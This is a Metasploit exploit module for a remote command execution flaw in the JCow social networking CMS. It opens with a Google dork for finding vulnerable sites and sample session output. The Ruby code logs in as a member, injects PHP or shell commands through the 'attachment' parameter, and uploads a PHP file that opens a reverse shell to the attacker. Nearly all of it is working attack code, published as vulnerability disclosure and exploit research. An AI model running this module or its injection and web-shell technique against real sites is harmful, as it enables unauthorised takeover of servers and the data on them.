# Google Dork: "intext: Powered by Jcow"
# Date: 2011-08-26
# Author: Aung Khant <http://yehg.net, YGN Ethical Hacker Group>
# Software Link: http://sourceforge.net/projects/jcow/files/jcow4/jcow.4.2.1.zip/download
# Version: 4.x:4.2 <= , 5.x: 5.2 <=
# Tested on: FreeBSD
# Advisory URL: http://yehg.net/lab/pr0js/advisories/[jcow_4.2,5.2]_arbitrary_code_execution
 
#[*] Started reverse handler on 1.2.3.4:4444
#[*] Trying to login as hax0r
#[*] Logged in successfully (cookie: bd665943297fe4bdc39ec704c21888ff)
#[*] Trying to pwn a shell
#[*] Uploading the payload: /files/h3x00rr.php
#[*] Uploaded successfully
#[*] Getting the shell
#[*] Sending stage (38553 bytes) to 5.6.7.8
#
 
require &#039;msf/core&#039;
 
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;JCow CMS Remote Command
Execution&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability in the JCow Social Networking CMS.
                    In versions (4.x: 4.2 and lower, 5.x: 5.2 and lower),
                    authenticated members can trigger php code execution via
                    "attachment" parameter.
            },
            &#039;Author&#039;         => [ &#039;Aung Khant <YGN Ethical Hacker Group, http://yehg.net/>&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 1 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://www.jcow.net/&#039; ],
                    [ &#039;URL&#039;, &#039;http://yehg.net/lab/pr0js/advisories/[jcow_4.2,5.2]_arbitrary_code_execution&#039; ]
                ],
            &#039;Privileged&#039;     => false,
            &#039;Payload&#039;        =>
                {
                    &#039;DisableNops&#039; => true,
                    &#039;BadChars&#039;    => "\#",
                    &#039;Space&#039;       => 4000,
                    &#039;Compat&#039;      =>{&#039;ConnectionType&#039; => &#039;find&#039;},
                    &#039;Keys&#039; => [&#039;php&#039;]           
                },
            &#039;Platform&#039;       => &#039;php&#039;,
            &#039;Arch&#039;           => ARCH_PHP,
            &#039;Targets&#039;        => [[ &#039;Automatic&#039;, { }]],
            &#039;DisclosureDate&#039; => &#039;Aug 26 2011&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new(&#039;URI&#039;, [true, "JCow directory path", "/"]),
                OptString.new(&#039;USERNAME&#039;, [ false, &#039;The username to authenticate as&#039;, &#039;hax0r&#039; ]),
                OptString.new(&#039;PASSWORD&#039;, [ false, &#039;The password for the specified username&#039;,&#039;pwn3d&#039; ]),
                OptString.new(&#039;COOKIE&#039;, [ false, &#039;Authenticated Cookie in face of ReCaptCha&#039; ]),
                OptString.new(&#039;PHP&#039;, [ false, &#039;Arbitrary PHP code to run&#039; ]),
                OptString.new(&#039;CMD&#039;, [ false, &#039;Arbitrary OS Command to run if PHP\&#039;s os cmd execution is not&#039; ]),
                OptString.new(&#039;SHELL&#039;, [ false, &#039;Get PHP Reverse Shell back to your Box&#039;])
            ], self.class)
    end
 
    def check
        uri = &#039;&#039;
        uri << datastore[&#039;URI&#039;]
        uri << &#039;/&#039; if uri[-1,1] != &#039;/&#039;
        res = send_request_raw(
            {
                &#039;uri&#039; => uri
            }, 25)
 
        if (res && res.body =~ /name="Generator" content="Jcow Social Networking Software. ?([0-9]\.[0-9])/)
                ver = $1
                print_status("Target Jcow version is #{ver}")
 
                vers = ver.split(&#039;.&#039;).map { |v| v.to_i }
 
                if (vers[0] == 5) and (vers[1] < 3)
                    return Exploit::CheckCode::Vulnerable
                elsif (vers[0] == 4) and (vers[1] < 3)
                    return Exploit::CheckCode::Vulnerable          
                elsif (vers[0] < 4)
                        return Exploit::CheckCode::Vulnerable          
                else
                    return Exploit::CheckCode::Safe
                end
        end
        print_error("Unable to determine exploitability. Go
Exploiting.")
    end
     
    def exploit
         
        uri_base    = &#039;&#039;
        uri_base << datastore[&#039;URI&#039;]
        uri_base << &#039;/&#039; if uri_base[-1,1] != &#039;/&#039;
 
     
        cookie = datastore[&#039;COOKIE&#039;]       
        if (cookie == nil)
            print_status("Trying to login as
#{datastore[&#039;USERNAME&#039;]}")
            cookie = get_login_cookie(uri_base)
            if (not cookie)
                raise RuntimeError, &#039;Unable to login!&#039;
            end
            print_status("Logged in successfully (cookie:
#{cookie})")
        else
            print_status("Using authenticated cookie: 
#{cookie}")
        end
         
        if (datastore[&#039;PHP&#039;])
            print_status("Executing PHP Code:
#{datastore[&#039;PHP&#039;]}")
            run_code(uri_base,cookie,datastore[&#039;PHP&#039;])
        end
         
        if (datastore[&#039;CMD&#039;])
            print_status("Executing CMD:
#{datastore[&#039;CMD&#039;]}")
            run_code(uri_base,cookie, datastore[&#039;CMD&#039;],&#039;os&#039;)
        end
         
        if (datastore[&#039;SHELL&#039;])
            print_status("Trying to pwn a shell")
            get_reverse_shell(uri_base,cookie)
        end
 
    end
 
 
    def get_login_cookie(uri_base)
 
        cookie = nil
 
        res = send_request_cgi(
            {
                &#039;method&#039;    => &#039;POST&#039;,
                &#039;uri&#039;       => uri_base +
&#039;?p=member/loginpost&#039;,
                &#039;vars_post&#039; =>
                    {
                        &#039;username&#039; =>
datastore[&#039;USERNAME&#039;],
                        &#039;password&#039; =>
datastore[&#039;PASSWORD&#039;]
                    }
            })
        if (not res or res.code != 302)
            print_error("Failed to login")
            if (res.body =~ /<script type="text\/javascript"
src="http:\/\/www.google.com\/recaptcha\/api\/challenge/)
                print_error("Recaptcha
Enabled\r\nProvide Authenticated Cookie")
            end
            return nil
        end
 
        if (res.headers[&#039;Set-Cookie&#039;] =~ /PHPSESSID=(.*);/)        
            cookie = $1
        else
            print_error("Unable to get authenticated
cookie")
            return
        end
         
        cookie
    end
 
    def run_code(uri_base, cookie, code, mode=&#039;php&#039;)
 
         
        cmd = nil
         
        if mode != &#039;php&#039;
            cmd = &#039;error_reporting(0);print+`&#039; <<
        else
            cmd = &#039;error_reporting(0);eval(&#039; << 
code.unpack("C*").collect{|x| "chr(#{x})"}.join(&#039;.&#039;) << &#039;)&#039;
        end
         
         
        data =
"page_id=0&page_type=u&message=hello&youtubeid=0&attachment=#{cmd};//"
        res = send_request_cgi(
            {
                &#039;method&#039;    => &#039;POST&#039;,
                &#039;uri&#039;       => uri_base +
&#039;?p=streampublish&#039;,
                &#039;data&#039;      => data ,
                 
                &#039;headers&#039;   =>
                    {
                              
                              &#039;Cookie&#039; =>
"PHPSESSID=#{cookie}"
                               
                    },
            }) 
        if (res)
            if (res.body.to_s.length > 0)       
                is_session_expired(res.body.to_s)  
                print_status("#{mode.upcase} Command
Output from the server:")
                print("\n" + res.body.to_s + "\n\n")
            else
                print_error("No data returned from the
server")
            end
        else
            print_error("Connection Timeout from the
server")
        end
         
    end
     
    def is_session_expired(pg)
        if (pg =~ /please login first/)
            raise RuntimeError, "Your Login has expired"
        end
    end
     
    def get_reverse_shell(uri_base,cookie)
     
        cmd_php = &#039;<?php &#039; << payload.encoded << &#039; ?>&#039;
 
        shell_file =  &#039;files/&#039; + rand_text_alphanumeric(6) << &#039;.php&#039;
         
        shell_url = uri_base + shell_file
         
        print_status("Uploading the payload: " << shell_url )
         
        encoded_shell_file = shell_file.unpack("C*").collect{|x|
"chr(#{x})"}.join(&#039;.&#039;)
         
        encoded_payload = payload.encoded
 
        cmd = "file_put_contents(#{encoded_shell_file},
$_SERVER[&#039;HTTP_X_CMD&#039;])"
 
        data =
"page_id=0&page_type=u&message=hello&youtubeid=0&attachment=#{cmd};//"
        res = send_request_cgi(
            {
                &#039;method&#039;    => &#039;POST&#039;,
                &#039;uri&#039;       => uri_base +
&#039;?p=streampublish&#039;,
                &#039;data&#039;      => data ,
                 
                &#039;headers&#039;   =>
                    {
                              &#039;X-CMD&#039; =>
cmd_php,
                               
                              &#039;Cookie&#039; =>
"PHPSESSID=#{cookie}"
                               
                    },
            }) 
 
        if (res)
            if (res.code.to_i > 200)
                print_error("Fail to upload :
#{res.code} #{res.body[0,500].inspect}...")
                return
            elsif (res.code == 200)
                is_session_expired(res.body.to_s)  
            end        
        end    
         
         
        print_status("Uploaded successfully")
        print_status("Getting the shell")
 
        res = send_request_raw(
                    {
                        &#039;global&#039; => true,
                        &#039;uri&#039;    => uri_base + shell_file
                         
                    })
                             
 
        handler
     
    end
 
end



